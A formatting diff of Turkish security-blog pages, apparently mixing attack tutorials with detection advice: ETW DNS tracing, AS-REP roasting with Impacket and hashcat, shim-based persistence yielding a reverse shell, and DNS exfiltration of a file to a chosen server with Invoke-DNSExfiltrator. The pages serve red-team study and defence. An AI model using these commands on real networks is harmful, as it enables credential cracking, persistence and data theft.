@@ -25,21 +25,21 @@
 &lt;li&gt;&lt;strong&gt;Keywords&lt;/strong&gt;: Consumerlara bilgiyi sağlayan olay türleridir. Burası önemli.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;strong&gt;ETW üzerinde çok önemli 2 fonksiyon bulunmaktadır. Bunlar: 1.NTTraceControl(Trace fonksiyonlarını yönetiyor) 2. NtTraceEvent (Aktiviteleri/Eventleri yazıyor.)&lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;NTSTATUS&lt;/span&gt;
-&lt;span class="n"&gt;NtTraceControl&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;FunctionCode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;InBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;InBufferLen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;OutBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;OutBufferLen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ReturnSize&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;NTSTATUS
+NtTraceControl (
+    ULONG FunctionCode,
+    PVOID InBuffer,
+    ULONG InBufferLen,
+    PVOID OutBuffer,
+    ULONG OutBufferLen,
+    ULONG *ReturnSize);
 
-&lt;span class="n"&gt;NTSTATUS&lt;/span&gt;
-&lt;span class="n"&gt;NtTraceEvent&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
-    &lt;span class="n"&gt;HANDLE&lt;/span&gt; &lt;span class="n"&gt;TraceHandle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;Flags&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;FieldSize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;Fields&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+NTSTATUS
+NtTraceEvent (
+    HANDLE TraceHandle,
+    ULONG Flags,
+    ULONG FieldSize,
+    PVOID Fields);
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Bu kadar teori yeter. Şimdi biraz da pratik kısmına bakalım.&lt;/p&gt;
@@ -81,7 +81,7 @@
 &lt;p&gt;&lt;img alt="image-20220206173433760" src="images/image-20220206173433760.png"&gt;&lt;/p&gt;
 &lt;p&gt;Burada kendisi bir output belirledi ve keyword olarak All  olarak algıladı fakat .etl dosyamda nedense hata verdi. Bende bu sebeple şöyle bir yola gittim. Siz de dilerseniz output çıktısını değiştirebilirsiniz. Daha fazlası için&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/logman"&gt;Windows Docs for Logman&lt;/a&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;logman update enesindnsleri -ow -o C:\Users\Enes\enesdns1.etl -p &amp;quot;Microsoft-Windows-DNS-Client&amp;quot; 0x10 -ets&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;logman update enesindnsleri -ow -o C:\Users\Enes\enesdns1.etl -p &amp;quot;Microsoft-Windows-DNS-Client&amp;quot; 0x10 -ets
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img alt="image-20220206175045137" src="images/image-20220206175045137.png"&gt;&lt;/p&gt;
@@ -90,12 +90,12 @@
 &lt;p&gt;Gördüğünüz gibi arkada Discord açık olduğu için Discord'un CDN sunucuları için bir DNS sorgusu atmışım. Pek tabi bu görüntüler takip açısından çok verimli değil ama bu kısımda Velociraptor kullanabilirsiniz. Bununla ilgili bir linki kullanabileceğiniz kaynaklar altına ekleyeceğim. Daha doğrusu tam halini ekleyeceğim.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="image-20220206181901173" src="images/image-20220206181901173.png"&gt;&lt;/p&gt;
 &lt;p&gt;Velociraptor VQL'i:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="k"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;TimeStamp&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="k"&gt;Timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-       &lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryName&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="n"&gt;Query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-       &lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryType&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="k"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-       &lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryResults&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="n"&gt;Answer&lt;/span&gt;
-&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;watch_etw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;guid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3020&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;TimeStamp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryName&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryType&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryResults&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Answer&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;watch_etw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;guid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3020&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Peki şimdi işin bu kısmını hallettik diyelim. Bu ne işimize yarayacak?  Bununla ilgili gördüğüm örnekler: &lt;/p&gt;
@@ -150,32 +150,32 @@
 &lt;p&gt;&lt;a href="https://tools.ietf.org/html/rfc4120"&gt;The Kerberos Network Authentication Service (V5)&lt;/a&gt;&lt;/p&gt;
 &lt;h2&gt;Kapalı Kullanıcıların Tespiti&lt;/h2&gt;
 &lt;p&gt;Eğer bir kullanıcının &lt;code&gt;Pre Authentication Required&lt;/code&gt; seçeneği disable'a çekilmişse aşağıda ki gibi bir log üretmektedir. &lt;code&gt;0x10&lt;/code&gt; değeri disabled hali &lt;code&gt;0x10010&lt;/code&gt; değeri ise enabled halidir. Bizim burada yakalamamız gereken değer &lt;code&gt;Enabled&lt;/code&gt; olduğunda kural üretmektir. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Old&lt;/span&gt; &lt;span class="n"&gt;UAC&lt;/span&gt; &lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;      &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x10&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Old UAC Value:      0x10
 
-    &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;UAC&lt;/span&gt; &lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;      &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x10010&lt;/span&gt;
+    New UAC Value:      0x10010
 
-    &lt;span class="k"&gt;User&lt;/span&gt; &lt;span class="n"&gt;Account&lt;/span&gt; &lt;span class="n"&gt;Control&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   
+    User Account Control:   
 
-        &lt;span class="s1"&gt;&amp;#39;Don&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;Require&lt;/span&gt; &lt;span class="n"&gt;Preauth&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Enabled&lt;/span&gt;
+        &amp;#39;Don&amp;#39;t Require Preauth&amp;#39; - Enabled
 
-    &lt;span class="k"&gt;User&lt;/span&gt; &lt;span class="k"&gt;Parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="o"&gt;-&lt;/span&gt;
+    User Parameters:    -
 
-    &lt;span class="n"&gt;SID&lt;/span&gt; &lt;span class="n"&gt;History&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
+    SID History:        -
 
-    &lt;span class="n"&gt;Logon&lt;/span&gt; &lt;span class="n"&gt;Hours&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
+    Logon Hours:        -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img alt="DC Log" src="images/dclog.png"&gt;&lt;/p&gt;
 &lt;p&gt;Eğer loglardan değil de bulunduğunuz bir sistem üzerinde tespit etmek isterseniz de 2 seçeneğimiz bulunuyor.&lt;/p&gt;
 &lt;p&gt;LDAP Toolkit indirerek DC üzerinde aşağıdaki sorgu ile kontrol edebilirsiniz. Burada PreauthNoRequired kısmını sorgulayan asıl kod &lt;code&gt;userAccountControl:1.2.840.113556.1.4.803:=4194304&lt;/code&gt; kısmıdır.
 LDAP:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;searchBase=&amp;quot;DC=EXAMPLE,DC=COM&amp;quot; filer=&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot; scope=&amp;quot;SUBTREE&amp;quot; timeLimit=&amp;quot;0&amp;quot; countLimit=&amp;quot;1000&amp;quot; aliasesDereferencingMethod=&amp;quot;ALWAYS&amp;quot; referralsHandlingMethod=&amp;quot;IGNORE&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;searchBase&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;DC=EXAMPLE,DC=COM&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;filer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;scope&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SUBTREE&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;timeLimit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;countLimit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1000&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;aliasesDereferencingMethod&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ALWAYS&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;referralsHandlingMethod&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IGNORE&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;PowerShell üzerinde ise &lt;code&gt;Get-DomainUser -PreauthNoRequired&lt;/code&gt; sorgusu ile domain üzerinde ki kullanıcıları listeleyebilirsiniz.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Domain User" src="images/GetDomainUser.png"&gt;&lt;/p&gt;
 &lt;p&gt;Daha fazlası için: &lt;a href="https://ldapwiki.com/wiki/Active%20Directory%20RISK%20Related%20Searches"&gt;LDAPWiki Risks Pre-Authentication&lt;/a&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;searchBase=&amp;quot;DC=EXAMPLE,DC=COM&amp;quot; filer=&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot; scope=&amp;quot;SUBTREE&amp;quot; timeLimit=&amp;quot;0&amp;quot; countLimit=&amp;quot;1000&amp;quot; aliasesDereferencingMethod=&amp;quot;ALWAYS&amp;quot; referralsHandlingMethod=&amp;quot;IGNORE&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;searchBase&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;DC=EXAMPLE,DC=COM&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;filer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;scope&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SUBTREE&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;timeLimit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;countLimit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1000&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;aliasesDereferencingMethod&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ALWAYS&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;referralsHandlingMethod&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IGNORE&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h1&gt;AS-REP Roasting Nedir&lt;/h1&gt;
@@ -191,7 +191,7 @@ LDAP:&lt;/p&gt;
 &lt;/ul&gt;
 &lt;p&gt;Öncelikle bizim bu saldırı vektörünü yapabilmemiz için bir kullanıcı listesine ihtiyacımız var. Bu sebeple bir dosya yaratıp ben içerisinde 2-3 tane user ekliyorum. Ekliyorum çünkü neden olmasın? Evet bu kadar. Saldırı vektörümüzü çalıştırmaya hazırız. Bunun için aşağıdaki gibi bir komut yeterli olacaktır.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Impacket examples içerisinde bulabilirsiniz&lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;python3 GetNPUsers.py windomain.local -usersfile usernames.txt -format hashcat -outputfile hash.asrep&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 GetNPUsers.py windomain.local -usersfile usernames.txt -format hashcat -outputfile hash.asrep
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Aşağıda ekran görüntüsünde göreceğiniz üzere bazılarında hata aldık çünkü Kerberos DB üzerinde ilgili kullanıcıları bulamadı fakat bizim 3 tane kullanıcımız vardı. Bize 2 tane hata çıkartılmış o sebeple diyebiliriz ki 1  tanesine ait hash'i elde ettik.&lt;/p&gt;
@@ -201,7 +201,7 @@ LDAP:&lt;/p&gt;
 &lt;p&gt;Evet &lt;code&gt;Impacket&lt;/code&gt; ile yaptığımız saldırı sonucunda elimizde bir hashimiz var ve bu hashi kırmak için elimizde tam da ona uygun çıktısıyla bir araç var ismi &lt;code&gt;hashcat&lt;/code&gt;. Kendisi ile ilgili bir çok yazı bulabilirsiniz. AS-REP isteğimiz sonucu dönen değeri kırabilmek için kendisi üzerinde öntanımlı bir hash tipi ve ID'si bulunmaktadır.&lt;/p&gt;
 &lt;p&gt;Hashcat üzerinde 18200 ID'li hash tipi ile kırabilirsiniz.
 &lt;code&gt;.\hashcat.exe --help | findstr 18200&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;18200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Kerberos&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;etype&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;23&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AS&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;REP&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="err"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Protocols&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Normal AS-REP ve zararlı AS-REP trafiğini görebileceğiniz network trafiğine ait PCAP dosyasını aşağıdan indirebilirsiniz.&lt;/p&gt;
@@ -273,7 +273,7 @@ LDAP:&lt;/p&gt;
 &lt;p&gt;Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. &lt;/p&gt;
 &lt;h2&gt;Arayüz Olmadan Enjekte Etmek&lt;/h2&gt;
 &lt;p&gt;Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde &lt;code&gt;spoolsv.exe&lt;/code&gt; dosyasına enjekte edilmiştir.&lt;/p&gt;
@@ -282,21 +282,21 @@ LDAP:&lt;/p&gt;
 Uzun cevap:&lt;/p&gt;
 &lt;p&gt;Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. &lt;/p&gt;
 &lt;p&gt;Bu klasöre ulaşmak için: &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
-&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.&lt;/p&gt;
 &lt;h2&gt;Tespit etmek&lt;/h2&gt;
 &lt;p&gt;Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde &lt;code&gt;12&lt;/code&gt; event ID ile tetiklenecektir. &lt;/p&gt;
 &lt;p&gt;Registry konumları:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\&lt;/span&gt;
-&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Dosya konumu:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
-&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Daha detaylı bir bilgi almak için Sean Price'ın &lt;a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf"&gt;sunumunu&lt;/a&gt; kullanabilirsiniz.&lt;/p&gt;
@@ -348,9 +348,9 @@ Nedir DNS'in çalışma mantığı?&lt;/p&gt;
 &lt;p&gt;Server üzerinde 
 &lt;code&gt;dnsexfiltrator.py -d domain -p PAROLA&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Client üzerinde&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;c:\DNSExfiltrator&amp;gt; powershell&lt;/span&gt;
-&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1&lt;/span&gt;
-&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;c:\DNSExfiltrator&amp;gt; powershell
+PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1
+PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;ul&gt;
